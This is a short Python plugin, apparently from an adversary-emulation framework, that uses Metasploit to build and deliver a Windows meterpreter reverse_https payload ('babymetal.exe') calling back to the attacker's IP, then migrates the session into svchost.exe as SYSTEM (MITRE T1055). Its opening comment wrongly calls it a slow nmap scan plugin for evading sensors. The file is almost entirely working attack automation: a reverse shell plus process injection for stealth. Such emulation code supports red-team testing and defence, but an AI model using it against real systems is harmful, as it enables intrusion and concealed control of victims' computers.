#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin, Requirement
from app.metasploit import MetasploitInstant
import socket


class MetasploitMigratePlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_migrate"
    description = "Migrate meterpreter to another process via metasploit"
    ttp = "T1055"
    references = ["https://attack.mitre.org/techniques/T1055/"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    requirements = [Requirement.METASPLOIT]

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())

        self.metasploit.smart_infect(target,
                                payload=payload_type,
                                architecture="x64",
                                platform="windows",
                                lhost=ip,
                                format="exe",
                                outfile=payload_name
                                )

        self.metasploit.migrate(target, user="NT AUTHORITY\\SYSTEM", name="svchost.exe", arch="x64")

        return res
